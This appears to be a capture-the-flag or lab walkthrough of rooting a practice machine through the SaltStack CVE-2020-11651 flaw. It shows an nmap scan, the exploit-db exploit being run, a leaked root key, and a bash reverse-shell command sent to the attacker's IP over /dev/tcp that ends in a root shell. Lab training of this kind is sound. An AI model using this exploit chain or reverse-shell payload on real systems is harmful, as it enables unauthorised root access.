- First we run the nmap scan:
┌──(mel㉿kali)-[~]
└─$ sudo nmap -p- -sV 192.168.52.62

- Receive the following results:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-28 05:54 UTC
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 4.71% done; ETC: 05:57 (0:03:02 remaining)
Nmap scan report for 192.168.52.62
Host is up (0.0011s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1

- We notice Port 8000 is open, so we can try to curl the IP to see if it yields any results:
curl http://192.168.52.62:8000 -v
*   Trying 192.168.52.62:8000...
* Connected to 192.168.52.62 (192.168.52.62) port 8000
> GET / HTTP/1.1
> Host: 192.168.52.62:8000
> User-Agent: curl/8.9.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.16.1
< Date: Sat, 28 Dec 2024 06:01:39 GMT
< Content-Type: application/json
< Content-Length: 146
< Connection: keep-alive
< Access-Control-Expose-Headers: GET, POST
< Vary: Accept-Encoding
< Allow: GET, HEAD, POST
< Access-Control-Allow-Credentials: true
< Access-Control-Allow-Origin: *
< X-Upstream: salt-api/3000-1
< 
* Connection #0 to host 192.168.52.62 left intact
{"clients": ["local", "local_async", "local_batch", "local_subset", "runner", "runner_async", "ssh", "wheel", "wheel_async"], "return": "Welcome"}

- We notice X-Upstream: salt-api/3000-1. Then, we google and find an exploit on exploit-db (https://www.exploit-db.com/exploits/48421) for CVE-2020-11651. We download this source code and modify our python version in order to support salt:
kali@kali:~$ python3 -m venv env
...
kali@kali:~$ . ./env/bin/activate
(env) kali@kali:~$ pip install distro salt

- Now, we can attempt to exploit using the source code and reading how to use it:
???(env)?(kali?kali)-[~/Downloads]
??$ python3 CVE_2020_11651.py --master 192.168.52.62 --port 4506
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/kali/Downloads/env/lib/python3.12/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.52.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: yRJf6KcMheGt6fA3HMtk2MP7A+no97bLn63sq9i4VDdZsNsCGRxgP6SPt2vbqwVd9clfjwc5+o8=
....

- We can confirm it IS vulnerable. So now, we use the code to carry our payload per its instructions (master tack is the vulnerable IP and 192.168.49.52 is our IP). It is important to use port 4506/4505 for this attack. First, we create a listener in a separate window:
nc -lvp 4506
Then run the command in our attack window:
python3 CVE_2020_11651.py --master 192.168.52.62 --port 4506 --exec 'bash -i >& /dev/tcp/192.168.49.52/4506 0>&1'

- Attack looks successful on our listener:
nc -lvp 4506
listening on [any] 4506 ...

192.168.52.62: inverse host lookup failed: Unknown host
connect to [192.168.49.52] from (UNKNOWN) [192.168.52.62] 53680
bash: no job control in this shell
[root@twiggy root]# 
[root@twiggy root]# id                                              
id
uid=0(root) gid=0(root) groups=0(root)
[root@twiggy root]# ls
ls
proof.txt

- Success!



